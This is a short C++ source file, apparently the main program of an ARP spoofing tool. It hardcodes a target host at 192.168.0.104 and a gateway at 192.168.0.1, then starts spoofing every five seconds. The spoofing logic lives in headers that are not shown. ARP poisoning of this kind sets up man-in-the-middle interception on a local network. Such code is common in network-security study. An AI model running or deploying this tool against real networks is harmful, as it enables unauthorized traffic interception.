
#include <cstdio>
#include <print>

#include "arp_spoofer.hpp"
#include "frames.hpp"
#include "net_interfaces.hpp"

namespace {
[[nodiscard]] auto networkInterfacesErrorCodeToString(
    network_interfaces::Errors error) -> std::string {
    using network_interfaces::Errors;
    switch (error) {
        case Errors::CanNotGetSocketFd:
            return "Can not get socket file descriptor.";
        case Errors::CanNotGetInterfaceFlags:
            return "Can not get interface flags.";
        case Errors::CanNotGetInterfacePrAddr:
            return "Can not get interface protocol address.";
        case Errors::CanNotGetInterfaceHwAddr:
            return "Can not get interface hardware address.";
        case Errors::CanNotGetInterfaceIndex:
            return "Can not get interface index.";
    }
}
}  // namespace

auto main() -> int {
    const ArpFrame::praddr_t target_praaddr{192, 168, 0, 104};
    const ArpFrame::praddr_t node_praddr{192, 168, 0, 1};
    const u32 interval = 5;

    auto spoofer = ArpSpoofer::create(target_praaddr, node_praddr);
    if (not spoofer) {
        perror(networkInterfacesErrorCodeToString(spoofer.error()).c_str());
        std::terminate();
    }
    std::println("Spoofer initialized. Starting...");
    spoofer->startSpoofing(interval);

    return EXIT_SUCCESS;
}
